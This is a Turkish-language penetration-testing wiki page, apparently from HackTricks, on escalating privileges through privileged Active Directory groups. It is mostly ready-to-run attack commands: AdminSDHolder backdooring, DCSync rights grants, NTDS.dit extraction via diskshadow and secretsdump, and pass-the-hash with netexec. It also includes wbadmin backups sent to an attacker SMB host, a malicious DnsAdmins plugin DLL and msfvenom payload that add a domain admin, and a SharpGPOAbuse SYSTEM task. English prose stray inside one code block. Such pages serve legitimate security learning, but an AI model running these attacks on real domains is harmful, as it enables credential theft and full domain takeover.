# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Yönetici ayrıcalıklarına sahip bilinen gruplar

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Bu grup, etki alanında yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Domain Controller'a (DC) yerel olarak oturum açmayı sağlar.

Bu grubun üyelerini belirlemek için aşağıdaki komut çalıştırılır:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Yeni kullanıcılar eklemeye ve DC'de yerel olarak oturum açmaya izin verilir.<sup>[[1]](#references)</sup>

Hesap yönetiminden yerel yönetici erişimine giden koşullu bir yol, **bir bilgisayarın LAPS parolasını okumak için yetkilendirilmiş sıradan bir gruptur**. Bu grubun etkin üyelik yazma haklarını, korumalı olup olmadığını ve yeni ya da kontrol edilen bir hesabın gerçekten bu gruba katılıp katılamayacağını kontrol edin. Hedef bilgisayarın LAPS okuma iznini sınamadan önce hesabın token'ını yenileyin. Şifrelenmiş Windows LAPS için dizin okuma izni ve parolayı çözme yetkisi ayrı gereksinimlerdir; grup üyeliği veya Account Operators üyeliği tek başına bunlardan herhangi birini sağlamaz. Bkz. [Microsoft'un Account Operators kapsamı](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) ve [Windows LAPS yetkilendirmesi](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## AdminSDHolder grubu

**AdminSDHolder** grubunun Access Control List (ACL) öğesi kritik öneme sahiptir; çünkü Active Directory'deki yüksek ayrıcalıklı gruplar da dahil olmak üzere tüm "korumalı grupların" izinlerini belirler. Bu mekanizma, yetkisiz değişiklikleri önleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek standart bir kullanıcıya tam izinler verebilir. Böylece bu kullanıcı tüm korumalı gruplar üzerinde tam denetime sahip olur. Bu kullanıcının izinleri değiştirilir veya kaldırılırsa sistem tasarımı gereği bir saat içinde otomatik olarak yeniden uygulanır.<sup>[[14]](#references)</sup>

Güncel Windows Server belgeleri hâlâ yerleşik çeşitli operatör gruplarını **korumalı** nesneler olarak tanımlar (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` vb.). **SDProp** işlemi varsayılan olarak her 60 dakikada bir **PDC Emulator** üzerinde çalışır, `adminCount=1` değerini atar ve korumalı nesnelerde devralmayı devre dışı bırakır. Bu, hem kalıcılık sağlamak hem de korumalı bir gruptan çıkarılmış olmasına rağmen devralmayı devre dışı bırakan ACL'yi hâlâ taşıyan eski ayrıcalıklı kullanıcıları tespit etmek için yararlıdır.<sup>[[12]](#references)</sup>

Üyeleri incelemek ve izinleri değiştirmek için kullanılacak komutlar:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Restorasyon sürecini hızlandırmak için bir betik mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla bilgi için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) sayfasını ziyaret edin.<sup>[[14]](#references)</sup>

## AD Recycle Bin

Silinmiş nesnelerin görünürlüğü, etkin dizin izinleriyle belirlenir; yalnızca grup adı, mevcut kimliğin bir nesneyi listeleyebildiğini veya geri yükleyebildiğini kanıtlamaz. Tam geri yükleme için AD Recycle Bin'in silme işleminden önce etkinleştirilmiş olması gerekir. Ayrıca geri yükleme işlemi, naming-context kökünde Reanimate-Tombstones, yeniden adlandırma hakları ve hedef kapsayıcıda CREATE_CHILD izinlerini gerektirir. [Microsoft'un Recycle Bin yönergeleri](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) ve [silme işlemini geri alma yetkilendirme kuralları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) bu koşulları birbirinden ayırır. Silinmiş nesnelere okuma erişimi olan yetkili bir kimlik, hassas bilgileri açığa çıkarabilecek kayıtları inceleyebilir:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinen nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPN'ler veya silinmiş ve daha sonra başka bir operatör tarafından geri yüklenebilecek ayrıcalıklı bir grubun DN'sini açığa çıkarabilir.

Nesne silinmiş durumda kalırken uygulama tanımlı özniteliklerde eski kimlik bilgileri de bulunabilir. Bunu ayrı bir inceleme ipucu olarak değerlendirin: mevcut kimliğin silinen nesneyi listelemesine **ve** ilgili özniteliği okumasına izin verilmeli, değer kullanılabilir bir kimlik bilgisi olmalı ve hâlâ etkin bir sorumlu bu kimlik bilgisini kabul etmelidir. Grup üyeliği veya silinmiş bir hesap adı tek başına bu adımların hiçbirini kanıtlamaz; rutin listeleme sırasında kimlik bilgisi değerlerini yazdırmaktan kaçının. [Microsoft'un Geri Dönüşüm Kutusu belgeleri](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin), silme işleminden sonra özniteliklerin korunmasını açıklar.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Delegated ACL'ler aracılığıyla silinmiş bir hesabı yeniden etkinleştirme

Bir ACL aracının silinmiş bir hesap için verdiği `WRITE` sonucu, tüm silme işlemini geri alma izinlerinin etkili olduğunun kanıtı değil, bir ipucudur.<sup>[[18]](#references)</sup> Silinmiş nesnenin ACL'sini ve `lastKnownParent` değerini doğrudan inceleyin; BloodHound yolları silinmiş nesnelerin ACL'lerini içermeyebilir.<sup>[[19]](#references)</sup> Geri yüklenen bir hesap parola hash'ini koruyabilir, ancak hesabı geri yüklemek parolayı açığa çıkarmaz veya parola sıfırlama hakları vermez. Kimlik doğrulama için hâlâ geçerli bir kimlik bilgisi gerekir.<sup>[[19]](#references)</sup>

Gizli silinmiş hesapları listelemek ve Linux'tan reanimation hakkını doğrulamak için, geri dönüştürülmüş nesne ve devre dışı bırakılmış bağlantı LDAP kontrolleriyle `bloodyAD` kullanın. Ardından seçilen hesabı `sAMAccountName` değeriyle geri yükleyin. Örnek etki alanını, ana bilgisayarı ve kimliği değerlendirilen ortama göre değiştirin; yazma işleminden önce hedef DN'yi ve `lastKnownParent` değerini doğrulayın.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Domain Controller Access

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun üyesi olmadığı sürece kısıtlıdır; bu gruba üyelik erişim düzeyini değiştirir.

### Privilege Escalation

Sysinternals araçlarından `PsService` veya `sc` kullanılarak hizmet izinleri incelenip değiştirilebilir. Örneğin `Server Operators` grubu, belirli hizmetler üzerinde tam denetime sahiptir; bu da rastgele komutların çalıştırılmasına ve yetki yükseltmeye olanak tanır:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu ve bu sayede yükseltilmiş ayrıcalıklar elde etmek için hizmetleri değiştirebileceğini gösterir.

## Backup Operators

`Backup Operators` üyeliği, yerel ilkeye ve oturum açma oturumuna bağlı olarak bir host üzerinde `SeBackupPrivilege` ve `SeRestorePrivilege` ayrıcalıklarını sağlayabilir. Komutları çalıştıran sürecin **etkin token'ını** `whoami /groups` ve `whoami /priv` komutlarıyla kontrol edin: yalnızca üyelik, `SeBackupPrivilege` ayrıcalığının mevcut ve etkin olduğunu kanıtlamaz. Ayrıcalık mevcut ancak devre dışıysa, bu token'da etkinleştirilebilir; yoksa veya kaldırılmışsa yedekleme işlemleri bu ayrıcalığı kullanamaz. `SeBackupPrivilege`, yedekleme özellikli API'ler (örneğin, `FILE_FLAG_BACKUP_SEMANTICS` veya `robocopy /B`) aracılığıyla korumalı **okuma** işlemlerini destekler; `SeRestorePrivilege` ise geri yükleme/yazma işlemleri için ayrı bir ayrıcalıktır. Sıradan dizin listeleme ve kopyalama işlemleri yedekleme semantiğini kullanmayabilir.<sup>[[1]](#references)</sup>

Grup üyelerini listelemek için şu komutu çalıştırın:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Yerel Saldırı

Etkin token'da `SeBackupPrivilege` bulunan bir host'ta, aşağıdaki yedekleme farkındalığına sahip kopyalama işlemi korumalı bir dosyayı okuyabilir:

1. Gerekli kütüphaneleri içe aktarın:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Ayrıcalık mevcut ancak devre dışıysa etkinleştirin ve bu süreçteki durumunu doğrulayın:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Örneğin, kısıtlı bir dizinden dosya kopyalayın:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Saldırısı

`NTDS.dit`, **domain controller (DC)** üzerindeki Active Directory veritabanıdır. Bu yöntem, DC üzerinde uygun bir token ve veritabanını içeren volume'a erişim gerektirir; başka bir yerde Backup Operators üyeliği, belirli bir DC'ye erişim sağlamaz. Canlı veritabanı genellikle kilitli olduğundan, kopyalamadan önce erişilebilir bir shadow copy veya başka bir yedekleme olanağı kullanın. Shadow copy oluşturmak veya erişime açmak da ana bilgisayarın VSS yapılandırmasına ve çağıranın haklarına bağlıdır. Aşağıdaki örnek, DC'nin `NTDS.dit` dosyasını `C:` üzerinde `\Windows\NTDS` altında sakladığını varsayar; durum böyle değilse volume'u ve yolu ayarlayın.

#### diskshadow.exe Kullanımı

1. İzin verilmişse, DC'nin `C:` sürücüsünün bir shadow copy'sini oluşturun ve `F:` olarak erişime açın:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. `NTDS.dit` dosyasını shadow copy'den kopyalayın:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternatif olarak, dosyaları kopyalamak için `robocopy` kullanın:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Çevrimdışı çıkarım için DC'nin `SYSTEM` hive'ını kaydedin. `SAM`, üye sistemlerde yerel hesap veritabanıdır; DC'nin `SAM` hive'ı `NTDS.dit`'in yerine geçmez ve etki alanı Administrator hash'inin kaynağı değildir:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. `ntds.dit` ve `SYSTEM.SAV` dosyalarını analiz ana bilgisayarına aktarın ve etki alanı hesaplarının hash'lerini çıkarın. Bir üye sistemden alınan ve eşleşen `SYSTEM` kovanıyla birlikte kullanılan `SAM` kovanı ise yerel hesap hash'lerini verir:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. `NTDS.dit` dosyasından bir **domain** Administrator hash'i kurtarıldıysa, domain kimlik doğrulaması için test edilebilir. `SAM.SAV` dosyasındaki yerel Administrator hash'i farklı bir kimlik bilgisidir ve domain Administrator olarak kimlik doğrulaması yapmaz.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### wbadmin.exe kullanımı

1. Saldırgan makinesinde SMB sunucusu için NTFS dosya sistemi kurun ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeklemesi ve `NTDS.dit` çıkarımı için `wbadmin.exe` kullanın:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Pratik bir gösterim için [IPPSEC İLE DEMO VİDEOSU](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) izleyin.

## DnsAdmins

**DnsAdmins** grubunun üyeleri, ayrıcalıklarını kullanarak genellikle Domain Controller'larda barındırılan bir DNS sunucusunda SYSTEM ayrıcalıklarıyla rastgele bir DLL yükleyebilir. Bu özellik, önemli bir istismar potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için şunu kullanın:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Keyfi DLL yürütme (CVE‑2021‑40469)

> [!NOTE]
> Bu güvenlik açığı, DNS hizmetinde (genellikle DC'lerin içinde) SYSTEM ayrıcalıklarıyla keyfi kod yürütülmesine olanak tanır. Bu sorun 2021'de giderildi.

Üyeler, aşağıdaki gibi komutlarla DNS sunucusunun keyfi bir DLL'i (yerel olarak veya uzak bir paylaşımdan) yüklemesini sağlayabilir:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

DLL'nin yüklenmesi için DNS hizmetinin yeniden başlatılması (ek izinler gerektirebilir) gerekir:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Bu saldırı vektörü hakkında daha fazla bilgi için ired.team'e bakın.

#### Mimilib.dll

Komut yürütmek için mimilib.dll kullanmak da mümkündür; belirli komutları veya reverse shell'leri çalıştıracak şekilde düzenlenebilir. Daha fazla bilgi için [bu gönderiye bakın](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).<sup>[[15]](#references)</sup>

### MitM için WPAD Kaydı

DnsAdmins, genel sorgu engelleme listesini devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak DNS kayıtlarını manipüle edebilir ve Man-in-the-Middle (MitM) saldırıları gerçekleştirebilir. Ağ trafiğini taklit etmek ve yakalamak için Responder veya Inveigh gibi araçlar kullanılabilir.

### Olay Günlüğü Okuyucuları
Üyeler, düz metin parolalar veya komut yürütme ayrıntıları gibi hassas bilgileri bulabilecekleri olay günlüklerine erişebilir:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Bu grup, etki alanı nesnesindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync ayrıcalıkları verebilir. Bu gruptan yararlanarak ayrıcalık yükseltme teknikleri Exchange-AD-Privesc GitHub reposunda ayrıntılı olarak açıklanmıştır.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Bu grubun bir üyesi gibi hareket edebiliyorsanız, klasik kötüye kullanım yöntemi saldırganın kontrolündeki bir principal'a [DCSync](dcsync.md) için gereken replikasyon haklarını vermektir:

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Tarihsel olarak **PrivExchange**, aynı temel yeteneğe ulaşmak için posta kutusu erişimini, zorla Exchange kimlik doğrulamasını ve LDAP relay'i zincirledi. Bu relay yolu azaltılmış olsa bile `Exchange Windows Permissions` grubuna doğrudan üyelik veya bir Exchange sunucusu üzerinde denetim sahibi olmak, etki alanı çoğaltma haklarına ulaşmak için yüksek değerli bir yoldur.

## Hyper-V Administrators

Hyper-V Administrators, Hyper-V üzerinde tam erişime sahiptir; bu erişim sanallaştırılmış Etki Alanı Denetleyicilerini ele geçirmek için kullanılabilir. Buna çalışan DC'leri klonlamak ve `NTDS.dit` dosyasından NTLM hash'lerini çıkarmak da dahildir.

### Exploitation Örneği

Pratikte bu yetkinin kötüye kullanımı genellikle eski ana makine düzeyindeki LPE yöntemleri yerine **DC disklerine/checkpoint'lerine çevrimdışı erişim** şeklindedir. Hyper-V ana makinesine erişimi olan bir operatör, sanallaştırılmış bir Etki Alanı Denetleyicisinin checkpoint'ini alabilir veya dışa aktarabilir, VHDX'i bağlayabilir ve konuk sistemdeki LSASS'e dokunmadan `NTDS.dit`, `SYSTEM` ve diğer sırları çıkarabilir:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

From there, `Backup Operators` iş akışını yeniden kullanarak `Windows\NTDS\ntds.dit` dosyasını ve registry hive'larını çevrimdışı kopyalayın. İlgili backup-file iş akışı:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Bu grup, üyelerinin etki alanında Group Policy oluşturmasına olanak tanır. Ancak üyeleri, kullanıcı veya gruplara group policy uygulayamaz ya da mevcut GPO'ları düzenleyemez.

Önemli ayrıntı şudur: **oluşturan kişi yeni GPO'nun sahibi olur** ve genellikle sonrasında GPO'yu düzenlemeye yetecek haklara sahip olur. Bu nedenle, aşağıdaki durumlarda bu grup ilgi çekicidir:

- kötü amaçlı bir GPO oluşturup bir yöneticiyi bunu hedef OU'ya/etki alanına bağlamaya ikna edebilirsiniz
- oluşturduğunuz ve kullanışlı bir yere zaten bağlanmış olan bir GPO'yu düzenleyebilirsiniz
- GPO'ları bağlamanıza olanak tanıyan başka bir devredilmiş hakkı kötüye kullanırken, bu grup düzenleme yetkisini sağlayabilir

Uygulamada kötüye kullanım genellikle SYSVOL tabanlı policy dosyaları üzerinden bir **Immediate Task**, **startup script**, **local admin membership** veya **user rights assignment** değişikliği eklemeyi içerir.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

`SYSVOL` üzerinden GPO'yu elle düzenliyorsanız, değişikliğin tek başına yeterli olmadığını unutmayın: `versionNumber`, `GPT.ini` ve bazen `gPCMachineExtensionNames` de güncellenmelidir; aksi takdirde istemciler ilke yenilemesini yok sayar.<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange**'in dağıtıldığı ortamlarda, **Organization Management** adlı özel bir grup önemli yetkilere sahiptir. Bu grup, **etki alanındaki tüm kullanıcıların posta kutularına erişme** ayrıcalığına sahiptir ve **'Microsoft Exchange Security Groups'** Organizational Unit (OU) üzerinde **tam denetim** sahibidir. Bu denetim, ayrıcalık yükseltme amacıyla istismar edilebilen **`Exchange Windows Permissions`** grubunu da kapsar.

### Ayrıcalıkların İstismarı ve Komutlar

#### Print Operators

**Print Operators** grubunun üyelerine, **`SeLoadDriverPrivilege`** de dahil olmak üzere çeşitli ayrıcalıklar tanınır. Bu ayrıcalık, **Domain Controller'a yerel olarak oturum açmalarına**, onu kapatmalarına ve yazıcıları yönetmelerine olanak tanır. Bu ayrıcalıkları, özellikle **`SeLoadDriverPrivilege`** yükseltilmemiş bir bağlamda görünmüyorsa, istismar etmek için User Account Control (UAC) atlatılmalıdır.<sup>[[1]](#references)</sup>

Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Domain Controller'larda bu grup tehlikelidir; çünkü varsayılan Domain Controller Policy, **`SeLoadDriverPrivilege`** ayrıcalığını `Print Operators` grubuna verir. Bu grubun bir üyesi için yükseltilmiş bir token elde ederseniz, ayrıcalığı etkinleştirip imzalı ancak savunmasız bir driver yükleyerek kernel/SYSTEM düzeyine çıkabilirsiniz.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Token işleme ayrıntıları için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) bölümüne bakın.

#### Remote Desktop Users

Bu grubun üyelerine Remote Desktop Protocol (RDP) üzerinden bilgisayarlara erişim izni verilir. Bu üyeleri enumerate etmek için PowerShell komutları kullanılabilir:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

RDP'yi istismar etmeye ilişkin daha fazla bilgi, özel pentesting kaynaklarında bulunabilir.

#### Uzaktan Yönetim Kullanıcıları

Üyeler, **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyeler şu şekilde enumerate edilebilir:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

**WinRM** ile ilgili exploitation teknikleri için özel belgeler incelenmelidir.

#### Server Operators

Bu grup, Domain Controller'larda yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma dahil olmak üzere çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir.<sup>[[1]](#references)</sup> Üyeleri numaralandırmak için verilen komut şudur:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Etki Alanı Denetleyicilerinde `Server Operators` grubu genellikle **hizmetleri yeniden yapılandırmak veya başlatıp durdurmak** için yeterli hakları devralır ve varsayılan DC ilkesi aracılığıyla `SeBackupPrivilege`/`SeRestorePrivilege` ayrıcalıklarına da sahip olur. Uygulamada bu, onları **hizmet denetimi kötüye kullanımı** ile **NTDS çıkarımı** arasında bir köprü hâline getirir:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

**Bilinen bir hizmete** erişememek, hizmetleri listeleyememek anlamına gelmez. Service Control Manager, listeleme için `SC_MANAGER_ENUMERATE_SERVICE` ve bağlantı için `SC_MANAGER_CONNECT` izinlerini ayrı ayrı denetler; adı belirtilen bir hizmeti açmaksa `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` dahil olmak üzere hizmetin kendi izinlerini denetler. Genel bir `sc.exe query` komutu başarısız olsa bile etkin token'ı ve ilgili hizmetin ACL'sini inceleyin. Yapılandırma izinleri tek başına yalnızca olası bir fırsata işaret eder: daha yüksek ayrıcalıklı bir geçişin mümkün olup olmadığını hizmet kimliği, başlatma/durdurma izinleri ve kullanılabilir bir tetikleyici belirler. Bkz. [Microsoft'un hizmet erişim hakları başvurusu](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Bir hizmet ACL'si bu gruba değiştirme/başlatma izinleri veriyorsa, hizmeti rastgele bir komutu çalıştıracak şekilde ayarlayın, `LocalSystem` olarak başlatın ve ardından özgün `binPath` değerini geri yükleyin. Hizmet denetimi kısıtlanmışsa `NTDS.dit` dosyasını kopyalamak için yukarıdaki `Backup Operators` tekniklerine başvurun.

## References

- [1] [ired.team – Ayrıcalıklı Hesaplar ve Token Ayrıcalıkları](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Ayrıcalık Yükseltme için SeLoadDriverPrivilege'i Kötüye Kullanma](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO İzinlerini Kötüye Kullanma](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO'yu Kötüye Kullanma, Bölüm 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Red Teamer'lar için GPO'lar ve OU'lar Rehberi](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonim LDAP → Parola Spreyi → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Ek C: Active Directory'de Korunan Hesaplar ve Gruplar](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Domain Admin kalıcılığı elde etmek için AdminSDHolder'ı kötüye kullanma ve arka kapı ekleme](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory'de yükseltme için DnsAdmins ayrıcalığını kötüye kullanma](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll kenarının kötüye kullanımı hakkında bilgi](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver işlevi (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Silineni geri alma yetkilendirme kuralları](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
